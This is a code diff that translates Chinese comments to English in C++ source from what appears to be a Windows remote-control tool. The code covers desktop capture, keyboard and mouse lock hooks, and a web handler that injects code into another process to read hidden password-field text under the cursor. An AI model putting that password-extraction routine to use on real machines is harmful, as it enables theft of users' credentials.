@@ -692,24 +692,24 @@ DWORD capDesktop(HWND hWnd,WORD w,WORD h,bool ifCapCursor,long quality,LPBYTE &l
 		POINT ptCursor;
 		::GetCursorPos(&ptCursor);
 		//first get the window handle under the mouse cursor, then get that window's thread ID
-		//Attatchcurrent thread到specified的windowthread
-		//get该windowcurrentmousecursorhandle
+		//Attach current thread to the specified window thread
+		//get the current mouse cursor handle of that window
 		//Deattach
-		//!!!ifnot这样做，直接调用GetCursor()则totalyesgetcurrent thread的cursorhandle
-		//if没有set则get的totalyes漏斗cursorhandle
+		//!!!if not done this way, calling GetCursor() directly will only get the current thread's cursor handle
+		//if not set, the cursor handle retrieved will be the hourglass cursor handle
 		HWND hw=::WindowFromPoint(ptCursor);
 		if(hw==NULL) hw=hWnd;
 		DWORD hdl=::GetWindowThreadProcessId(hw,NULL);
 		::AttachThreadInput(::GetCurrentThreadId(),hdl,TRUE);
 		HCURSOR hCursor=::GetCursor();
 		::AttachThreadInput(::GetCurrentThreadId(),hdl,FALSE);
-		ICONINFO IconInfo;//getcursor的图标data 
+		ICONINFO IconInfo;//cursor icon data 
 		if (::GetIconInfo(hCursor, &IconInfo))
 		{
 			ptCursor.x -= ((int) IconInfo.xHotspot);
 			ptCursor.y -= ((int) IconInfo.yHotspot);
 		}
-		//at兼容设备description表上画出该cursor
+		//draw the cursor on the compatible device context
 		::DrawIconEx(
 		hMemDC, // handle to device context 
 		ptCursor.x, ptCursor.y,
@@ -723,13 +723,13 @@ DWORD capDesktop(HWND hWnd,WORD w,WORD h,bool ifCapCursor,long quality,LPBYTE &l
 	
 	if(::GetDIBits(hWndDC,hMemBmp,0,bih.biHeight,lpbuffer,(LPBITMAPINFO)&bih,DIB_RGB_COLORS))
 	{
-		//进行image缩小
+		//scale down the image
 		if(w!=0 && h!=0)
 		{
 			float f=(float)bih.biWidth/bih.biHeight;
 			float f1=(float)w/h;
 			if(f1>f) w=(WORD)(h*f); else h=(WORD)(w/f);
-			if(w<bih.biWidth && h<bih.biHeight) //进行image缩小
+			if(w<bih.biWidth && h<bih.biHeight) //scale down the image
 			{
 				long lEffwidth_src=bih.biSizeImage/bih.biHeight;
 				long x,y,lEffwidth_dst=w*3;
@@ -741,7 +741,7 @@ DWORD capDesktop(HWND hWnd,WORD w,WORD h,bool ifCapCursor,long quality,LPBYTE &l
 					ptr=ptrD;
 					for(int j=0;j<w;j++)
 					{
-						//count算该象素at原image中的坐标
+						//calculate pixel coordinates in the source image
 						x=(long)(fX*j); y=(long)(fY*i);
 						ptrS = lpbuffer + y * lEffwidth_src + x * 3;
 						*ptr++=*ptrS;
@@ -766,7 +766,7 @@ DWORD capDesktop(HWND hWnd,WORD w,WORD h,bool ifCapCursor,long quality,LPBYTE &l
 	return dwret;
 }
 
-//------------------getspecifiedpasswordwindow的password--------------------------------
+//------------------get the password of the specified password window--------------------------------
 #include "cInjectDll.h"
 typedef HWND (WINAPI *PWindowFromPoint)(POINT);
 typedef long (WINAPI *PGetWindowLong)(HWND,int);
@@ -774,7 +774,7 @@ typedef BOOL (WINAPI *PPostMessage)(HWND,UINT,WPARAM,LPARAM);
 typedef int  (WINAPI *PGetWindowText)(HWND,LPTSTR,int);
 typedef struct _TGETPSWDINFO
 {
-	POINT pt; //mousecurrent坐标点
+	POINT pt; //current mouse cursor position
 	PWindowFromPoint pfnWindowFromPoint;
 	PGetWindowLong pfnGetWindowLong;
 	PGetWindowText pfnGetWindowText;
@@ -791,14 +791,14 @@ DWORD WINAPI GetPswdFromWind(INJECTLIBINFO *pInfo)
 		if(hWnd==NULL) pInfo->dwReturnValue=2;
 		else{
 			long l=(*p->pfnGetWindowLong)(hWnd,GWL_STYLE);
-			if((l&ES_PASSWORD)==0) pInfo->dwReturnValue=1; //非PASSWOD window
+			if((l&ES_PASSWORD)==0) pInfo->dwReturnValue=1; //not a PASSWORD window
 			l=(*p->pfnGetWindowText)(hWnd,p->retPswdBuf,sizeof(p->retPswdBuf)-1);
 			p->retPswdBuf[l]=0;
 		}
 	}
 	return 0;
 }
-//getpasswordwindow的password
+//get the password of the password window
 bool webServer:: httprsp_getpswdfromwnd(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp,httpSession &session)
 {
 	const char *ptr; char buf[256];
@@ -814,7 +814,7 @@ bool webServer:: httprsp_getpswdfromwnd(socketTCP *psock,httpRequest &httpreq,ht
 	DWORD dwret,pid=0;
 	if( (hwnd=::WindowFromPoint(info.pt)) ) GetWindowThreadProcessId(hwnd,&pid);
 	
-	//initializationspecified的functionpointer
+	//initialize the specified function pointers
 	info.pfnGetWindowLong= (PGetWindowLong)GetProcAddress(GetModuleHandle
 						("User32.dll"),"GetWindowLongA");	
 	info.pfnGetWindowText= (PGetWindowText)GetProcAddress(GetModuleHandle
@@ -840,12 +840,12 @@ bool webServer:: httprsp_getpswdfromwnd(socketTCP *psock,httpRequest &httpreq,ht
 	return true;
 }
 
-//-------------------------------mouse键盘lock------------------------------
+//-------------------------------mouse/keyboard lock------------------------------
 /*--------------does not work; must use DLL method for global hook--------------------------
-static HHOOK g_hKBLockHook=NULL;//lock键盘mouse钩子handle
+static HHOOK g_hKBLockHook=NULL;//keyboard/mouse lock hook handle
 static HHOOK g_hMSLockHook=NULL;
 
-//一下defineatwinuser.h中但必须define了 #if (_WIN32_WINNT >= 0x0400)
+//the following are defined in winuser.h but require #if (_WIN32_WINNT >= 0x0400)
 #ifndef LLMHF_INJECTED
 
 #define WH_KEYBOARD_LL 13
@@ -870,7 +870,7 @@ typedef struct tagMSLLHOOKSTRUCT {
 
 #endif
 
-//lock键盘mousehandle钩子
+//keyboard lock hook handler
 LRESULT CALLBACK kbLockProc(
   int nCode,      // hook code
   WPARAM wParam,  // message identifier
@@ -884,7 +884,7 @@ LRESULT CALLBACK kbLockProc(
 	}
 	return 1;
 }
-//lock键盘mousehandle钩子
+//mouse lock hook handler
 LRESULT CALLBACK msLockProc(
   int nCode,      // hook code
   WPARAM wParam,  // message identifier
@@ -899,12 +899,12 @@ LRESULT CALLBACK msLockProc(
 	return 1;
 }
 
-//安装or卸载键盘mouse钩子
+//install or uninstall keyboard/mouse hook
 bool SetMouseKeybHook(bool bInstall)
 {
-	if(bInstall) //安装键盘mouse钩子
+	if(bInstall) //install keyboard/mouse hook
 	{
-		if(g_hKBLockHook || g_hMSLockHook) return true; //已经安装过
+		if(g_hKBLockHook || g_hMSLockHook) return true; //already installed
 		HMODULE hmdl=GetModuleHandle(NULL);
 		printf("aaaaaaaa hmdl=%d, GetLastError=%d \r\n",hmdl,GetLastError());
 		g_hKBLockHook=::SetWindowsHookEx(WH_KEYBOARD_LL,kbLockProc,hmdl,0);
@@ -913,7 +913,7 @@ bool SetMouseKeybHook(bool bInstall)
 		printf("g_hMSLockHook =%d, GetLastError=%d \r\n",g_hMSLockHook,GetLastError());
 		if(g_hKBLockHook && g_hMSLockHook) return true;
 	}
-	//卸载mouse钩子
+	//uninstall mouse hook
 	if(g_hKBLockHook) UnhookWindowsHookEx(g_hKBLockHook);
 	if(g_hMSLockHook) UnhookWindowsHookEx(g_hMSLockHook);
 	g_hKBLockHook=NULL; g_hMSLockHook=NULL;
